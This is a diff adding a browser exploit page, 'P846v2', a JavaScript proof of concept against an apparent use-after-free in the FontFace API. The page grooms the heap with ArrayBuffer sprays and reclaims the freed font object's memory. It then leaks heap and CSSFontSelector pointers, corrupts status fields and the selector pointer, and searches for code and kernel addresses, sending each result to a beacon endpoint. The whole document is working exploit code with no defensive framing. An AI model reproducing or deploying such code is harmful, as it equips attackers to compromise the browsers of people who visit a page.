@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P846v2</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P846v2: FontFace Data-Flow Oracle (groomed heap)</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P846v2-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+
+bn('BOOT','start');
+
+/* ============================================================
+   PHASE 0: Heap grooming — exhaust + release 192B free list
+   This ensures the NEXT 192B free → first 192B alloc pattern
+   ============================================================ */
+log('--- Phase 0: Heap grooming (192B) ---','info');
+
+/* Step 1: Allocate 300 AB(192) to exhaust the free list */
+var groomABs=[];
+for(var i=0;i<300;i++) groomABs.push(new ArrayBuffer(192));
+
+/* Step 2: Release them all — now 300 slots are on the 192B free list */
+groomABs=null;
+
+/* Step 3: Allocate 280 back — leaves ~20 slots, creating a "tight" free list */
+var plugABs=[];
+for(var i=0;i<280;i++) plugABs.push(new ArrayBuffer(192));
+
+log('  Groomed: 300 alloc → free → 280 plug. ~20 slots left.','ok');
+bn('GROOM','done');
+
+/* ============================================================
+   PHASE A: FontFace UAF — ATTEMPT 1
+   ============================================================ */
+log('','');
+log('--- Phase A: FontFace UAF (attempt 1) ---','hot');
+
+var fontAB=null,face=null,H=null,q13val=null;
+var stA=document.createElement('style');
+stA.textContent="@font-face{font-family:bbA;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stA);
+face=new FontFace('fA',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var ffiredA=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffiredA)return undefined;
+    ffiredA=true;
+    if(stA){stA.remove();stA.textContent='';stA=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    /* Release plug ABs to make room */
+    plugABs=null;
+    /* Spray 200 AB(192) — much bigger spray */
+    var abs=[];
+    for(var i=0;i<200;i++)abs.push(new ArrayBuffer(192));
+    for(var i=0;i<abs.length;i++){
+      var bu=new BigUint64Array(abs[i]);
+      for(var j=0;j<bu.length;j++){
+        if(bu[j]!==BigInt(0)){fontAB=abs[i];break;}
+      }
+      if(fontAB)break;
+    }
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em fA, bbA','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  if(!fontAB){
+    /* ATTEMPT 2: Different font family, fresh heap state */
+    bn('A1-MISS','try2');
+    log('  Attempt 1 missed — trying attempt 2...','fail');
+
+    var stB=document.createElement('style');
+    stB.textContent="@font-face{font-family:bbB;src:local(Arial);unicode-range:U+0043;}";
+    document.head.appendChild(stB);
+    var face2=new FontFace('fB',"local('Helvetica')",{unicodeRange:'U+0043'});
+    document.fonts.add(face2);
+    void face2.loaded;
+
+    var ffiredB=false;
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(ffiredB)return undefined;
+        ffiredB=true;
+        if(stB){stB.remove();stB.textContent='';stB=null;}
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        var abs2=[];
+        for(var i=0;i<200;i++)abs2.push(new ArrayBuffer(192));
+        for(var i=0;i<abs2.length;i++){
+          var bu=new BigUint64Array(abs2[i]);
+          for(var j=0;j<bu.length;j++){
+            if(bu[j]!==BigInt(0)){fontAB=abs2[i];face=face2;break;}
+          }
+          if(fontAB)break;
+        }
+        return undefined;
+      },set:function(){}
+    });
+    document.fonts.load('1em fB, bbB','CD');
+
+    setTimeout(function(){
+      delete FontFace.prototype.then;
+      if(!fontAB){
+        bn('A2-MISS','both-failed');
+        log('  BOTH attempts missed. Aborting.','fail');
+        log('====== P846v2 COMPLETE (no UAF) ======','hot');
+        bn('DONE-MISS','0');
+        return;
+      }
+      bn('A2-HIT','got-it');
+      log('  Attempt 2 HIT!','ok');
+      runOracle();
+    },400);
+    return;
+  }
+
+  bn('A1-HIT','got-it');
+  log('  Attempt 1 HIT!','ok');
+  runOracle();
+},500);
+
+function runOracle(){
+  var bu=new BigUint64Array(fontAB);
+  H=bu[11]-BigInt(0x68);
+  q13val=bu[13];
+  log('H = '+hexQ(H),'ok');
+  log('q13 = '+hexQ(q13val)+' (CSSFontSelector*)','ok');
+  bn('HEAP','H='+hexQ(H)+'|q13='+hexQ(q13val));
+
+  /* ============================================================
+     PHASE B: Full baseline dump of all 24 qwords
+     ============================================================ */
+  log('','');
+  log('--- Phase B: Baseline 192B dump ---','hot');
+
+  var baseline=[];
+  for(var i=0;i<24;i++) baseline.push(bu[i]);
+
+  var codeHits=[];
+  var nzCount=0;
+  for(var i=0;i<24;i++){
+    var v=baseline[i];
+    if(v===BigInt(0))continue;
+    nzCount++;
+    var hi=Number(v>>BigInt(32));
+    var tag='';
+    if(hi===0)tag='(small)';
+    else if(hi>=0x10 && hi<=0x1000)tag='(HEAP)';
+    else if(hi>0x10 && hi<0x8000){tag='(CODE?)';codeHits.push('q'+i+'='+hexQ(v));}
+    else if(hi>=0xFFFF8000){tag='(KERN?)';codeHits.push('q'+i+'='+hexQ(v));}
+    log('  q'+i.toString().padStart(2,' ')+' [+0x'+(i*8).toString(16).padStart(3,'0')+'] = '+hexQ(v)+' '+tag,
+      tag.indexOf('CODE')>=0||tag.indexOf('KERN')>=0?'hot':'info');
+  }
+  bn('BASE','nz='+nzCount+'|code='+codeHits.length+(codeHits.length?'|'+codeHits.join('|'):''));
+
+  /* ============================================================
+     PHASE C: m_status sweep — change status byte, call face.load()
+     m_status at byte offset 130 (0x82)
+     ============================================================ */
+  log('','');
+  log('--- Phase C: m_status data-flow sweep ---','hot');
+
+  var u8=new Uint8Array(fontAB);
+  var STATUS_OFF=130;
+  var cAllChanges=[];
+
+  for(var status=0;status<=4;status++){
+    var preDump=new Uint8Array(192);
+    preDump.set(u8);
+
+    u8[STATUS_OFF]=status;
+
+    var loadErr=null;
+    try{face.load();}catch(e){loadErr=e.name+':'+String(e.message).slice(0,40);}
+
+    var changes=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==preDump[i]){
+        changes.push('+0x'+(i).toString(16).padStart(2,'0')+'='+preDump[i].toString(16)+'->'+u8[i].toString(16));
+      }
+    }
+
+    var newCode=[];
+    for(var qi=0;qi<24;qi++){
+      var v=bu[qi];
+      if(v!==baseline[qi] && v!==BigInt(0)){
+        var hi=Number(v>>BigInt(32));
+        if(hi>0x10 && hi<0x8000)newCode.push('q'+qi+'='+hexQ(v));
+        else if(hi>=0xFFFF8000)newCode.push('q'+qi+'='+hexQ(v)+'(K)');
+      }
+    }
+
+    var r='s'+status+'|'+(loadErr?'E:'+loadErr:'ok')+'|c='+changes.length+'|code='+newCode.length;
+    if(changes.length>0)r+='|'+changes.slice(0,6).join(',');
+    if(newCode.length>0)r+='|CODE='+newCode.join(',');
+    cAllChanges.push(r);
+    bn('C-'+status,r);
+
+    log('  s='+status+': '+(loadErr?'ERR':'ok')+' chg='+changes.length+
+      (changes.length>0?' ['+changes.slice(0,4).join(' ')+']':'')+
+      (newCode.length>0?' *** '+newCode.join(' ')+' ***':''),
+      newCode.length>0?'hot':(changes.length>0?'ok':''));
+
+    u8.set(preDump);
+  }
+  bn('C-ALL',cAllChanges.join('||'));
+
+  /* ============================================================
+     PHASE D: face.loaded promise write trace (200ms wait)
+     ============================================================ */
+  log('','');
+  log('--- Phase D: Promise write trace ---','hot');
+
+  var preP=new Uint8Array(192);
+  preP.set(u8);
+  u8[STATUS_OFF]=0;
+
+  var pRes='?';
+  try{var p=face.loaded;pRes=p&&typeof p.then==='function'?'promise':String(p).slice(0,15);}catch(e){pRes='E:'+e.name;}
+  bn('D-P',pRes);
+  log('  face.loaded => '+pRes,'info');
+
+  setTimeout(function(){
+    var pChg=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==preP[i])pChg.push('+0x'+i.toString(16)+'='+preP[i].toString(16)+'->'+u8[i].toString(16));
+    }
+    bn('D-DIFF','n='+pChg.length+(pChg.length?'|'+pChg.slice(0,8).join(','):''));
+    log('  Promise diff: '+pChg.length+' bytes'+(pChg.length>0?' ['+pChg.slice(0,4).join(' ')+']':''),'info');
+    u8.set(preP);
+    phaseE();
+  },200);
+
+  /* ============================================================
+     PHASE E: Sentinel zero — zero each qword, load, check rewrite
+     ============================================================ */
+  function phaseE(){
+    log('','');
+    log('--- Phase E: Sentinel zero + load ---','hot');
+
+    var offsets=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23];
+    var eHits=[];
+
+    for(var oi=0;oi<offsets.length;oi++){
+      var qi=offsets[oi];
+      var orig=bu[qi];
+      bu[qi]=BigInt(0);
+      u8[STATUS_OFF]=0;
+
+      try{face.load();}catch(e){}
+
+      var nv=bu[qi];
+      if(nv!==BigInt(0)){
+        var hi=Number(nv>>BigInt(32));
+        var tag=(hi>0x10&&hi<0x8000)?'CODE!':(hi>=0xFFFF8000)?'KERN!':(nv===orig)?'restored':'new';
+        eHits.push('q'+qi+'='+hexQ(nv)+'('+tag+')');
+        log('  q'+qi+' [+0x'+(qi*8).toString(16)+']: 0 → '+hexQ(nv)+' ['+tag+']',
+          tag==='CODE!'||tag==='KERN!'?'hot':'ok');
+      }
+      bu[qi]=orig;
+      u8[STATUS_OFF]=Number(baseline[16]&BigInt(0xFF))||2;
+    }
+
+    bn('E-ALL','n='+eHits.length+'|'+eHits.slice(0,12).join('|'));
+    if(!eHits.length)log('  No fields rewritten after zeroing','fail');
+
+    phaseF();
+  }
+
+  /* ============================================================
+     PHASE F: q13 self-redirect — point selector at our AB
+     ============================================================ */
+  function phaseF(){
+    log('','');
+    log('--- Phase F: q13→self redirect ---','hot');
+
+    var origQ13=bu[13];
+    var pre=new Uint8Array(192);
+    pre.set(u8);
+
+    bu[13]=H;
+    u8[STATUS_OFF]=0;
+
+    var fErr=null;
+    try{face.load();}catch(e){fErr=e.name;}
+
+    var fChg=[],fCode=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==pre[i])fChg.push('+0x'+i.toString(16)+'='+pre[i].toString(16)+'->'+u8[i].toString(16));
+    }
+    for(var qi=0;qi<24;qi++){
+      var v=bu[qi];
+      var hi=Number(v>>BigInt(32));
+      if(v!==BigInt(0) && (hi>0x10&&hi<0x8000))fCode.push('q'+qi+'='+hexQ(v));
+      if(v!==BigInt(0) && hi>=0xFFFF8000)fCode.push('q'+qi+'='+hexQ(v)+'(K)');
+    }
+
+    bn('F-RES','err='+(fErr||'ok')+'|chg='+fChg.length+'|code='+fCode.length+
+      (fChg.length?'|'+fChg.slice(0,5).join(','):'')+
+      (fCode.length?'|CODE='+fCode.join(','):''));
+    log('  redirect: '+(fErr?'ERR:'+fErr:'ok')+' chg='+fChg.length+
+      (fCode.length?' *** '+fCode.join(' ')+' ***':''),
+      fCode.length?'hot':(fChg.length?'ok':'info'));
+
+    bu[13]=origQ13;
+    u8.set(pre);
+
+    phaseG();
+  }
+
+  /* ============================================================
+     PHASE G: fonts.check + iteration data flow
+     ============================================================ */
+  function phaseG(){
+    log('','');
+    log('--- Phase G: fonts ops ---','hot');
+
+    var pre=new Uint8Array(192);
+    pre.set(u8);
+
+    var readded=false;
+    try{document.fonts.add(face);readded=true;}catch(e){}
+
+    if(readded){
+      var chk='?';
+      try{chk=String(document.fonts.check('1em fA'));}catch(e){chk='E';}
+      bn('G-CHK',chk);
+      log('  check='+chk,'info');
+
+      try{var cnt=0;document.fonts.forEach(function(){cnt++;});bn('G-IT',cnt);}catch(e){}
+    } else {
+      bn('G-SKIP','no-readd');
+    }
+
+    var gChg=[],gCode=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==pre[i])gChg.push('+0x'+i.toString(16)+'='+pre[i].toString(16)+'->'+u8[i].toString(16));
+    }
+    for(var qi=0;qi<24;qi++){
+      var v=bu[qi];
+      var hi=Number(v>>BigInt(32));
+      if(v!==BigInt(0) && (hi>0x10&&hi<0x8000))gCode.push('q'+qi+'='+hexQ(v));
+    }
+    bn('G-DIFF','chg='+gChg.length+'|code='+gCode.length);
+    log('  fonts ops: chg='+gChg.length+(gCode.length?' CODE: '+gCode.join(' '):''),'info');
+
+    /* ============================================================
+       PHASE H: face.family / face.style / face.weight READ trace
+       These getters may dereference CSSFontFace fields differently
+       ============================================================ */
+    log('','');
+    log('--- Phase H: Face property reads ---','hot');
+
+    var preH=new Uint8Array(192);
+    preH.set(u8);
+
+    var props={};
+    try{props.family=face.family;}catch(e){props.family='E:'+e.name;}
+    try{props.style=face.style;}catch(e){props.style='E:'+e.name;}
+    try{props.weight=face.weight;}catch(e){props.weight='E:'+e.name;}
+    try{props.stretch=face.stretch;}catch(e){props.stretch='E:'+e.name;}
+    try{props.unicodeRange=face.unicodeRange;}catch(e){props.unicodeRange='E:'+e.name;}
+    try{props.display=face.display;}catch(e){props.display='E:'+e.name;}
+    try{props.status=face.status;}catch(e){props.status='E:'+e.name;}
+    try{props.variant=face.variant;}catch(e){props.variant='E:'+e.name;}
+    try{props.featureSettings=face.featureSettings;}catch(e){props.featureSettings='E:'+e.name;}
+
+    var hChg=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==preH[i])hChg.push('+0x'+i.toString(16)+'='+preH[i].toString(16)+'->'+u8[i].toString(16));
+    }
+
+    var propStr=Object.keys(props).map(function(k){return k+'='+String(props[k]).slice(0,20);}).join('|');
+    bn('H-PROPS',propStr);
+    bn('H-DIFF','chg='+hChg.length);
+    log('  family='+props.family+' style='+props.style+' weight='+props.weight,'info');
+    log('  status='+props.status+' display='+props.display,'info');
+    log('  prop reads: '+hChg.length+' byte changes','info');
+
+    /* ============================================================
+       PHASE I: face.family SETTER — does writing back trigger vtable?
+       ============================================================ */
+    log('','');
+    log('--- Phase I: Face property writes ---','hot');
+
+    var preI=new Uint8Array(192);
+    preI.set(u8);
+
+    try{face.family='testFam';}catch(e){bn('I-FAM-E',e.name);}
+    try{face.style='italic';}catch(e){bn('I-STY-E',e.name);}
+    try{face.weight='bold';}catch(e){bn('I-WGT-E',e.name);}
+    try{face.display='swap';}catch(e){bn('I-DSP-E',e.name);}
+
+    var iChg=[],iCode=[];
+    for(var i=0;i<192;i++){
+      if(u8[i]!==preI[i])iChg.push('+0x'+i.toString(16)+'='+preI[i].toString(16)+'->'+u8[i].toString(16));
+    }
+    for(var qi=0;qi<24;qi++){
+      var v=bu[qi];
+      var hi=Number(v>>BigInt(32));
+      if(v!==BigInt(0) && v!==baseline[qi]){
+        if(hi>0x10&&hi<0x8000)iCode.push('q'+qi+'='+hexQ(v));
+        if(hi>=0xFFFF8000)iCode.push('q'+qi+'='+hexQ(v)+'(K)');
+      }
+    }
+
+    bn('I-DIFF','chg='+iChg.length+'|code='+iCode.length+
+      (iChg.length?'|'+iChg.slice(0,8).join(','):'')+
+      (iCode.length?'|CODE='+iCode.join(','):''));
+    log('  prop writes: '+iChg.length+' byte changes'+
+      (iCode.length?' *** CODE: '+iCode.join(' ')+' ***':''),
+      iCode.length?'hot':(iChg.length?'ok':'info'));
+
+    log('','');
+    log('====== P846v2 COMPLETE ======','hot');
+    bn('DONE','H='+hexQ(H)+'|q13='+hexQ(q13val)+'|codeBL='+codeHits.length);
+  }
+}
+</script></body></html>
